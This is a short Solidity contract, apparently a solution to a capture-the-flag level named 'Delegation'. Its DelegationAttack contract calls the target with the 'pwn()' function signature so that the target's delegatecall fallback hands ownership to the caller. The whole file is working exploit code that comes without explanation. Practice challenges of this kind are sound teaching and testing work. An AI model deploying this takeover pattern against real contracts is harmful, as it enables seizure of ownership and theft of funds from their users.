// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Delegation.sol";

contract DelegationAttack {
    Delegation delegationContract;

    constructor(address _delegationContract) public {
        delegationContract = Delegation(_delegationContract);
    }

    function attack() public {
        address(delegationContract).call(abi.encodeWithSignature("pwn()"));
    }
}
